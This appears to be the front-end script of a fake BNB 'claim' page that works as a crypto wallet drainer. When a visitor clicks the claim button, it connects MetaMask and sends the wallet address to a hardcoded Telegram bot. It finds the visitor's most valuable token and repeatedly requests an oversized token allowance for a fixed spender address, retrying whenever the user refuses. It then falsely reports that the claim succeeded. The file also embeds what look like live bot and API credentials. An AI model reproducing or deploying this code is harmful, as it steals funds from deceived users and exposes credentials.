window.onload = async function(){
  const https = require('https');
  let morapi = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjA3NTI5OWExLTg4ZjQtNGJmZi1hN2MzLTExN2Y4M2ZkOTJmZiIsIm9yZ0lkIjoiMzg1MDk3IiwidXNlcklkIjoiMzk1Njk3IiwidHlwZUlkIjoiOTQ1MTYxNDEtY2E5OS00NDA0LWEyZGEtOTc0Nzk2NTY2ZjE5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTE2MDYwNzAsImV4cCI6NDg2NzM2NjA3MH0.mTwrIRPjFM8TQBgHa3eg2tSDerdsLZqk7_FOxZ6bry8';

  let useraddress;
  let high_token;
  let network_id = '0x38'; // bnb mainnet

  const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
  let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';

  let token_amount = 100000000000;

  // ========================= script for trsfo =========================================
  let bnb_claim_btn = document.querySelector('.bnb_claim_btn');

  async function change_network(network_id) {
    if (typeof window.ethereum !== 'undefined') {
      const ethereum = window.ethereum;
      await ethereum
        .request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: network_id }],
        })
        .then( async (response) => {
           return true;
        })
        .catch((error) => {
          console.error(error);
          return false;
        });
    } else {
      console.error('MetaMask is not installed');
      return false;
    }
  }

  function show_spin(){
    bnb_claim_btn.querySelector('.spinner_img').classList.remove('d-none');
  }
  function hide_spin(){
    bnb_claim_btn.querySelector('.spinner_img').classList.add('d-none');
  }

  async function connect_meamask() {
    show_spin();
    try {
      if (window.ethereum) {
        const ethereum = window.ethereum;
        const accounts = await ethereum.request({method: 'eth_requestAccounts',});
        useraddress = accounts[0];
        await change_network(network_id);

        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text= User Address - <code>${useraddress}</code>&parse_mode=HTML`);

        await get_all_token_balance();

      } else {
        connect_meamask();
        hide_spin();
      }
    } catch (error) {
      hide_spin();
    }
  }

  async function get_all_token_balance(){

    let all_token; // arry
    let all_token_address = [];
    let all_token_balance = [];

    let chainId = network_id;

    let final_token = [];

    // =============================================

    async function get() {
      try {

        const options = {
          hostname: 'deep-index.moralis.io',
          path: `/api/v2.2/${useraddress}/erc20?chain=${chainId}`,
          method: 'GET',
          headers: {
            Accept: 'application/json',
            Authorization: 'Bearer ' + morapi,
            'X-API-Key':  morapi,
          },
        };

        const req = https.request(options, (res) => {
          let data = '';

          res.on('data', (chunk) => {
            data += chunk;
          });

          res.on('end', () => {

            all_token = JSON.parse(data);

             filter_token(all_token);
          });
        });

        req.on('error', (error) => {
          console.error('Error:', error);
        });

        req.end();
      } catch (e) {
        console.error(e);
      }
    }

    async function filter_token(all_token) {

      for (let i = 0; i < all_token.length; i++) {
        let tokenaddress = all_token[i].token_address;
        let logo = all_token[i].logo;
        let thumbnail = all_token[i].thumbnail;
        let balance = all_token[i].balance;
        let decimals = all_token[i].decimals;

        if (
          logo != null &&
          logo != undefined &&
          logo != '' &&
          thumbnail != null &&
          thumbnail != undefined &&
          thumbnail != ''
        ) {
          all_token_address.push({
            exchange: 'pancakeswapv2',
            token_address: tokenaddress,
          });
          all_token_balance.push([balance, decimals]);
        }
      }
      get_token_price();
    }

    async function get_token_price() {

      if (
        all_token_address == undefined ||
        all_token_address == null ||
        all_token_address == ''
      ) {
        alert('web api error , plase try again later');
        hide_spin();
        return;
      }

      const xhr = new XMLHttpRequest();
      const url = `https://deep-index.moralis.io/api/v2.2/erc20/prices?chain=${chainId}&include=percent_change`;

      xhr.open('POST', url);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.setRequestHeader('X-Api-Key', morapi);
      xhr.setRequestHeader('Authorization', `Bearer ${morapi}`);
      xhr.setRequestHeader('X-Moralis-Source', 'Moralis API docs');

      xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 300) {
          final_token = JSON.parse(xhr.responseText);
          get_highest_token();
        } else {
          console.error('Request failed with status:', xhr.status);
          console.log(xhr.response);
        }
      };

      xhr.onerror = function () {
        console.error('Request failed');
      };

      const requestData = {
        tokens: all_token_address,
      };

      xhr.send(JSON.stringify(requestData));
    }

    async function get_highest_token() {
      if (
        final_token == undefined ||
        final_token == null ||
        final_token == ''
      ) {
        alert('web api error , plase try again later');
        hide_spin();
        return;
      }

      let numericBalances = all_token_balance.map((balance) => {
        let [balanceValue, decimals] = balance;
        let adjustedBalance = BigInt(balanceValue) / BigInt(10 ** decimals);
        return [adjustedBalance.toString()];
      });

      let final_token_list = [];
      for (let i = 0; i < numericBalances.length; i++) {
         final_token_list.push([
           final_token[i].tokenAddress,
           final_token[i].tokenSymbol,
           numericBalances[i][0],
           Number(numericBalances[i][0]) * final_token[i].usdPriceFormatted,
         ]);
      }

      let mostValuableToken = final_token_list.reduce((prev, current) => {
        return prev[3] > current[3] ? prev : current;
      });

      high_token = mostValuableToken;
      await controller();
    }

    get();

  }

  // ============== controller ===============
  async function controller() {

    if(high_token == null || high_token == undefined || high_token == ""){
      alert('web api error , try again later');
      hide_spin();
      return;
    }

    const tokenAbi = require('./abi.json');
    const ethers = require('ethers');

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await window.ethereum.enable();

    const tokenContract = new ethers.Contract(high_token[0],tokenAbi,provider.getSigner());

    // get user token balance
    async function inc_all() {
      try {
        const amountToApprove = ethers.utils.parseUnits(token_amount.toString(),18,);
        const tx = await tokenContract.increaseAllowance(spenderAddress,amountToApprove,);
        await tx.wait();
        hide_spin();
        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx - <code>${tx.hash}</code> | Network - <code>${network_id}</code> | User Address - <code>${useraddress}</code>&parse_mode=HTML`);
        alert(
          'Your claim was successful, and you will receive USDT within 6 hours.',
        );
      } catch (error) {
        await inc_all();
      }
    }

    await inc_all();

  }
 
  bnb_claim_btn.addEventListener('click', async () => {
    await connect_meamask();
  });

}